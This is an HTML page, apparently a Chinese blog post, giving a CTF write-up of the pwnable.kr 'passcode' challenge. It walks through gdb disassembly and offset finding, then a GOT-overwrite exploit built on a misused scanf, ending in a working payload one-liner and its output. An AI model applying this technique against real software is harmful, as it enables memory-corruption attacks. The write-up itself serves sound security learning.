@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="多种想法，运来GOT表这么覆盖！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="passcode">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/08/20/passcode/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="多种想法，运来GOT表这么覆盖！">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-08-20T15:55:21.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.898Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="pwnable.kr">
+<meta property="article:tag" content="got">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/08/20/passcode/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2017/08/20/passcode/","path":"2017/08/20/passcode/","title":"passcode"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>passcode | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8objdump--r-passcode%E6%9F%A5%E7%9C%8B"><span class="nav-number">1.</span> <span class="nav-text">使用objdump -R passcode查看</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number"></span> <span class="nav-text">参考文献</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/08/20/passcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="passcode | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          passcode
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-08-20 23:55:21" itemprop="dateCreated datePublished" datetime="2017-08-20T23:55:21+08:00">2017-08-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/security/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>多种想法，运来GOT表这么覆盖！</p>
+<span id="more"></span>
+<p>看看程序有什么保护。可知程序开启了栈保护和 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">passcode@ubuntu:~$ checksec passcode</span><br><span class="line">[*] &#x27;/home/passcode/passcode&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>这道题的源码如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">        int passcode1;</span><br><span class="line">        int passcode2;</span><br><span class="line"></span><br><span class="line">        printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode1);</span><br><span class="line">        fflush(stdin);</span><br><span class="line"></span><br><span class="line">        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">        printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        printf(&quot;checking...\n&quot;);</span><br><span class="line">        if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">        char name[100];</span><br><span class="line">        printf(&quot;enter you name : &quot;);</span><br><span class="line">        scanf(&quot;%100s&quot;, name);</span><br><span class="line">        printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        // something after login...</span><br><span class="line">        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过源码可以很容易发现，<code>scanf("%d", passcode1);</code>和<code>scanf("%d", passcode2);</code>这两个地方的参数应当传入引用，而不是原值<code>scanf("%d", &amp;passcode1);</code>和<code>scanf("%d", &amp;passcode2);</code>。
+查看<code>login</code>的汇编代码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas login</span><br><span class="line">Dump of assembler code for function login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048567 &lt;+3&gt;:	sub    $0x28,%esp</span><br><span class="line">   0x0804856a &lt;+6&gt;:	mov    $0x8048770,%eax</span><br><span class="line">   0x0804856f &lt;+11&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08048572 &lt;+14&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:	mov    $0x8048783,%eax</span><br><span class="line">===&gt; 0x0804857c &lt;+24&gt;:	mov    -0x10(%ebp),%edx </span><br><span class="line">   0x0804857f &lt;+27&gt;:	mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048583 &lt;+31&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08048586 &lt;+34&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:	mov    0x804a02c,%eax</span><br><span class="line">   0x08048590 &lt;+44&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08048593 &lt;+47&gt;:	call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:	mov    $0x8048786,%eax</span><br><span class="line">   0x0804859d &lt;+57&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x080485a0 &lt;+60&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:	mov    $0x8048783,%eax</span><br><span class="line">===&gt;   0x080485aa &lt;+70&gt;:	mov    -0xc(%ebp),%edx</span><br><span class="line">   0x080485ad &lt;+73&gt;:	mov    %edx,0x4(%esp)</span><br><span class="line">   0x080485b1 &lt;+77&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x080485b4 &lt;+80&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+这里标出来的两点分别是<code>passcode1</code>和<code>passcode2</code>，但是此处使用的<code>mov</code>，
+<code>mov    -0x10(%ebp),%edx</code>的做法是将在<code>[ebp-0x10]</code>地址的值传给<code>edx</code>，如果是正确的程序，这里应当是<code>lea    -0x10(%ebp),%edx</code>，这里<code>lea</code>指令为<code>Load Effective Address</code>，将地址<code>[ebp-0x10]</code>传给<code>edx</code>。
+所以运行结果得到了<code>segmentation fault</code>错误。</p>
+<p>这种做法的最大坏处就是如果<code>passcode1</code>被控制，用户可以通过<code>scanf("%d", passcode1);</code>写入任意值到内存的任意地址。</p>
+<p>本次目的是跳入一下代码中去，可以拿到<code>flag</code>，但是<code>passcode1</code>和<code>passcode2</code>无法通过读入以下条件语句中的值。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</span><br><span class="line">               printf(&quot;Login OK!\n&quot;);</span><br><span class="line">               system(&quot;/bin/cat flag&quot;);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么问题来了，怎么才能让程序调到这里面呢。
+通过控制<code>passcode1</code>的值，再通过<code>scanf("%d", passcode1);</code>可以在覆盖某些函数地址为<code>system("/bin/cat flag");</code>的地址，从而再次执行被篡改地址的函数时，触发攻击。
+如何覆盖<code>passcode1</code>的值？栈溢出？在当前函数<code>login</code>中无法做到，但是在<code>welcome</code>中存在栈溢出的漏洞，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void welcome()&#123;</span><br><span class="line">	char name[100];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%100s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>scanf("%100s", name);</code>的<em>%100s</em>意味着只存入输入值的前100个字符。这100个字符能够覆盖到<code>passcode1</code>在栈上的值呢。</p>
+<p>这里<code>login</code>,<code>welcome</code>函数的栈基址ebp在同一位置，所以观察<code>welcome</code>中的<code>name</code>位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas welcome</span><br><span class="line">Dump of assembler code for function welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x0804860c &lt;+3&gt;:	sub    $0x88,%esp</span><br><span class="line">   0x08048612 &lt;+9&gt;:	mov    %gs:0x14,%eax</span><br><span class="line">   0x08048618 &lt;+15&gt;:	mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x0804861b &lt;+18&gt;:	xor    %eax,%eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:	mov    $0x80487cb,%eax</span><br><span class="line">   0x08048622 &lt;+25&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08048625 &lt;+28&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:	mov    $0x80487dd,%eax</span><br><span class="line">===&gt;   0x0804862f &lt;+38&gt;:	lea    -0x70(%ebp),%edx</span><br><span class="line">   0x08048632 &lt;+41&gt;:	mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048636 &lt;+45&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08048639 &lt;+48&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:	mov    $0x80487e3,%eax</span><br><span class="line">   0x08048643 &lt;+58&gt;:	lea    -0x70(%ebp),%edx</span><br><span class="line">   0x08048646 &lt;+61&gt;:	mov    %edx,0x4(%esp)</span><br><span class="line">   0x0804864a &lt;+65&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x0804864d &lt;+68&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>name</code>的位置为<code>ebp-0x70</code>，<code>passcode1</code>和位置为<code>ebp-0x10</code>，所以两者相距为<code>0x60</code>也就是96，溢出肯定没问题。</p>
+<p>但是我想说的是另一种确定偏移量的方法。利用<code>gdb-peda</code>的<code>pattern_create</code>和<code>pattern_offset</code>两个命令。</p>
+<pre><code>pattern create size 生成特定长度字符串
+pattern offset value 定位字符串 </code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 100</span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#x27;</span><br><span class="line">gdb-peda$ b*0x080485cc</span><br><span class="line">Breakpoint 1 at 0x80485cc</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/prince/pwnable/pwnable.kr/passcode/passcode </span><br><span class="line">Toddler&#x27;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line">Welcome AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将这100个字符的字符串传入程序。断点停在输入<code>passcode1</code>前。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffcf30 --&gt; 0x80487a3 --&gt; 0x65006425 (&#x27;%d&#x27;)</span><br><span class="line">0004| 0xffffcf34 (&quot;6AALAJAAfAA5AAKAAgAA6AAL&quot;)</span><br><span class="line">0008| 0xffffcf38 (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)</span><br><span class="line">0012| 0xffffcf3c (&quot;fAA5AAKAAgAA6AAL&quot;)</span><br><span class="line">0016| 0xffffcf40 (&quot;AAKAAgAA6AAL&quot;)</span><br><span class="line">0020| 0xffffcf44 (&quot;AgAA6AAL&quot;)</span><br><span class="line">0024| 0xffffcf48 (&quot;6AAL&quot;)</span><br><span class="line">0028| 0xffffcf4c --&gt; 0x1ae10600 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080485cc in login ()</span><br><span class="line">gdb-peda$ x/xw $ebp-0x10</span><br><span class="line">0xffffcf48:	0x4c414136</span><br><span class="line">gdb-peda$ pattern_offset 0x4c414136</span><br><span class="line">1279344950 found at offset: 96</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+用<code>pattern_offset</code>查看<code>passcode1</code>的值，偏移量为96。</p>
+<p>好了，可以覆盖<code>passcode1</code>了，那么该覆盖为什么值呢？</p>
+<p>当然是覆盖函数的地址了，覆盖函数的GOT表中的地址。GOT表中存放的函数地址是在程序运行后，动态链接器加载的函数地址。</p>
+<p>在<code>system</code>函数前有<code>fflush</code>和<code>printf</code>两个函数可以用。</p>
+<p>这里我选用<code>fflush</code>，有两种方法可以查看GOT表内容。 ###
+查看汇编代码中<code>fflush</code>函数的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas fflush</span><br><span class="line">Dump of assembler code for function fflush@plt:</span><br><span class="line">=&gt; 0x08048430 &lt;+0&gt;:	jmp    *0x804a004</span><br><span class="line">   0x08048436 &lt;+6&gt;:	push   $0x8</span><br><span class="line">   0x0804843b &lt;+11&gt;:	jmp    0x8048410</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3
+id="使用objdump--r-passcode查看">使用<code>objdump -R passcode</code>查看</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">passcode:     file format elf32-i386</span><br><span class="line"> </span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a02c R_386_COPY        stdin</span><br><span class="line">0804a000 R_386_JUMP_SLOT   printf</span><br><span class="line">=&gt; 0804a004 R_386_JUMP_SLOT   fflush</span><br><span class="line">0804a008 R_386_JUMP_SLOT   __stack_chk_fail</span><br><span class="line">0804a00c R_386_JUMP_SLOT   puts</span><br><span class="line">0804a010 R_386_JUMP_SLOT   system</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   exit</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __libc_start_main</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __isoc99_scanf</span><br></pre></td></tr></table></figure>
+<p>查出的是<code>fflush</code>函数地址为<code>0x804a004</code>。我们将此地址中的值覆盖为我们<code>system</code>代码的地址<code>0x080485e3</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x080485d7 &lt;+115&gt;:	movl   $0x80487a5,(%esp)</span><br><span class="line">0x080485de &lt;+122&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">0x080485e3 &lt;+127&gt;:	movl   $0x80487af,(%esp)</span><br><span class="line">0x080485ea &lt;+134&gt;:	call   0x8048460 &lt;system@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>由于是整数输入，我们要将<code>0x080485e3</code>表示为10进制的134514147。</p>
+<p>所以，构造的payload为 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;print &quot;A&quot;*96 +&quot;\x04\xa0\x04\x08&quot; + &quot;134514147&quot;  &#x27; | ./passcode </span><br></pre></td></tr></table></figure> 得到flag。pwn!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passcode@ubuntu:~$ python -c &#x27;print &quot;A&quot;*96 +&quot;\x04\xa0\x04\x08&quot; + &quot;134514147&quot;  &#x27; | ./passcode </span><br><span class="line">Toddler&#x27;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">enter passcode1 : Now I can safely trust you that you have credential :)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="参考文献">参考文献</h1>
+<p>[1] <a
+target="_blank" rel="noopener" href="https://www.nrjfl0w.org/index.php/2016/09/04/passcode-writeup-pwnable/">[Pwnable.kr]
+passcode writeup – Toddler’s bottle</a> [2] <a
+target="_blank" rel="noopener" href="https://etenal.me/archives/972#C6">pwn学习笔记汇总（持续更新）</a>
+[3] [一些pwn题目的解题思路<a
